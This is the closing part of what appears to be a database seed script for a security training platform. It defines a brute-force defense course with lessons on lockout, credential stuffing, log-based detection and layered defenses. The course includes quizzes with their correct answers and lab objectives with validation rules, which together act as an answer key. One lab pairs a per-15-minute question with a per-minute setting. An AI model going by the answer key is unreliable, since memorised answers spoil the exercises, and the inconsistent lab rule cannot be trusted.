                    { type: "alert", variant: "warning", content: "Permanent lockout can be weaponized for denial-of-service. Use temporary lockout with progressive delays instead." },
                  ],
                  quizzes: {
                    create: [
                      { question: "Why is permanent account lockout problematic?", options: ["It can be used for denial-of-service attacks", "It uses too much memory", "It is too complex to implement", "It reduces password security"], correctAnswer: "It can be used for denial-of-service attacks", explanation: "Attackers can intentionally lock out legitimate users by making failed attempts against their accounts.", xpReward: 25, orderIndex: 0 },
                    ],
                  },
                  labs: {
                    create: [
                      {
                        title: "Rate Limit Configuration Lab",
                        description: "Configure and test rate limiting and lockout parameters in the simulation.",
                        labType: "BRUTE_FORCE_SIMULATION",
                        orderIndex: 0,
                        maxXp: 50,
                        minXp: 10,
                        hintPenalty: 5,
                        timeoutSeconds: 300,
                        objectives: [
                          { id: "obj-bf-rl-1", description: "Set lockout threshold to 5 attempts and trigger the lockout mechanism", type: "RATE_LIMIT_CONFIG", validationRule: { configKey: "lockoutThreshold", configValue: "5" }, xpValue: 25, hints: ["Use the rate limit configuration panel", "Set lockout threshold to 5 and make 5 failed attempts"] },
                          { id: "obj-bf-rl-2", description: "Configure rate limit to 10 attempts per minute and observe the blocking", type: "RATE_LIMIT_CONFIG", validationRule: { configKey: "rateLimitPerMinute", configValue: "10" }, xpValue: 25, hints: ["Adjust the rate limit per minute setting", "Make rapid attempts to see rate limiting in action"] },
                        ],
                        sandboxConfig: {},
                      },
                    ],
                  },
                },
              ],
            },
          },
          {
            title: "Credential Stuffing Simulation",
            description: "Understand credential stuffing attacks and build defenses.",
            orderIndex: 2,
            lessons: {
              create: [
                {
                  title: "How Credential Stuffing Works",
                  orderIndex: 4,
                  maxXp: 25,
                  minXp: 5,
                  content: [
                    { type: "heading", content: "Credential Stuffing Attacks" },
                    { type: "text", content: "Credential stuffing uses username/password pairs from data breaches to attempt login on other services. It exploits password reuse across sites." },
                    { type: "list", items: ["Attackers obtain breach databases from dark web", "Automated tools test credentials across multiple services", "Success rates are typically 0.1-2% but yield thousands of accounts", "Password reuse is the root cause enabling these attacks"] },
                    { type: "alert", variant: "danger", content: "This is an educational overview. Never attempt credential stuffing against systems you do not own." },
                  ],
                  quizzes: {
                    create: [
                      { question: "What enables credential stuffing attacks?", options: ["Password reuse across services", "Weak encryption algorithms", "Open source software", "Cloud computing"], correctAnswer: "Password reuse across services", explanation: "Credential stuffing exploits the fact that many users reuse the same password across different services.", xpReward: 20, orderIndex: 0 },
                    ],
                  },
                },
                {
                  title: "Defending Against Credential Stuffing",
                  orderIndex: 5,
                  maxXp: 25,
                  minXp: 5,
                  content: [
                    { type: "heading", content: "Defense Strategies" },
                    { type: "text", content: "Multi-layered defense combines rate limiting, breach database checks, multi-factor authentication, and anomaly detection." },
                    { type: "list", items: ["Check passwords against known breach databases", "Implement MFA/2FA on all accounts", "Use CAPTCHA after suspicious patterns", "Monitor for distributed login attempts", "Detect impossible travel (logins from distant locations)"] },
                  ],
                  quizzes: {
                    create: [
                      { question: "Which defense is most effective against credential stuffing?", options: ["Multi-factor authentication", "Longer passwords only", "More complex password requirements", "Frequent password rotation"], correctAnswer: "Multi-factor authentication", explanation: "MFA prevents access even if credentials are compromised, making stolen passwords alone insufficient.", xpReward: 25, orderIndex: 0 },
                    ],
                  },
                },
              ],
            },
          },
          {
            title: "Detection and Defense Mechanisms",
            description: "Monitor, detect, and respond to brute force attack patterns.",
            orderIndex: 3,
            lessons: {
              create: [
                {
                  title: "Monitoring and Detection",
                  orderIndex: 6,
                  maxXp: 25,
                  minXp: 5,
                  content: [
                    { type: "heading", content: "Detecting Brute Force Attacks" },
                    { type: "text", content: "Effective detection relies on analyzing authentication logs for anomalous patterns: high failure rates, unusual source IPs, off-hours attempts, and distributed patterns." },
                    { type: "code", language: "sql", content: "-- Detect brute force patterns\nSELECT source_ip, COUNT(*) as attempts,\n  SUM(CASE WHEN success = false THEN 1 ELSE 0 END) as failures\nFROM auth_logs\nWHERE timestamp > NOW() - INTERVAL '15 minutes'\nGROUP BY source_ip\nHAVING COUNT(*) > 10 AND failures > 8;" },
                  ],
                  quizzes: {
                    create: [
                      { question: "What pattern in auth logs suggests a brute force attack?", options: ["High failure rate from single IP in short time", "Single successful login", "Regular timed logins", "Password reset request"], correctAnswer: "High failure rate from single IP in short time", explanation: "A rapid sequence of failed authentication attempts from the same source is the classic brute force signature.", xpReward: 20, orderIndex: 0 },
                    ],
                  },
                },
                {
                  title: "Defense in Depth",
                  orderIndex: 7,
                  maxXp: 30,
                  minXp: 5,
                  content: [
                    { type: "heading", content: "Layered Authentication Defense" },
                    { type: "text", content: "No single defense is sufficient. Combine multiple layers: network-level rate limiting, application-level lockout, breach database checks, MFA, and monitoring." },
                    { type: "list", items: ["Layer 1: WAF/CDN rate limiting", "Layer 2: Application rate limiting per IP and per account", "Layer 3: Progressive account lockout", "Layer 4: MFA for all users", "Layer 5: Real-time monitoring and alerting", "Layer 6: Breach database password checks on registration"] },
                    { type: "alert", variant: "info", content: "Defense in depth ensures that if one layer fails, others continue to protect the system." },
                  ],
                  quizzes: {
                    create: [
                      { question: "Why is defense in depth important for authentication?", options: ["If one layer fails, others continue protection", "It makes the system faster", "It reduces code complexity", "It eliminates all attacks"], correctAnswer: "If one layer fails, others continue protection", explanation: "Multiple defensive layers ensure no single point of failure in your security posture.", xpReward: 25, orderIndex: 0 },
                    ],
                  },
                  labs: {
                    create: [
                      {
                        title: "Failed Login Log Analysis",
                        description: "Analyze simulated authentication logs to identify brute force patterns and configure defenses.",
                        labType: "BRUTE_FORCE_SIMULATION",
                        orderIndex: 0,
                        maxXp: 50,
                        minXp: 10,
                        hintPenalty: 5,
                        timeoutSeconds: 300,
                        objectives: [
                          { id: "obj-bf-def-1", description: "How many login attempts before the account locks with a threshold of 5?", type: "PASSWORD_ANALYSIS", validationRule: { expectedOutput: "5" }, xpValue: 25, hints: ["The lockout threshold is the maximum failed attempts", "The answer matches the threshold value"] },
                          { id: "obj-bf-def-2", description: "What is the recommended minimum rate limit for production login endpoints (attempts per 15 min)?", type: "RATE_LIMIT_CONFIG", validationRule: { configKey: "rateLimitPerMinute", configValue: "5" }, xpValue: 25, hints: ["OWASP recommends very conservative limits", "5 attempts per 15 minutes is a common standard"] },
                        ],
                        sandboxConfig: {},
                      },
                    ],
                  },
                },
              ],
            },
          },
        ],
      },
    },
  });
  console.log(`  Created training course: ${bruteForceCourse.title} (${bruteForceCourse.id})`);

  console.log(`\nSeeded 3 training courses successfully.`);
}

main()
  .catch((e) => {
    console.error("Seed error:", e);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });
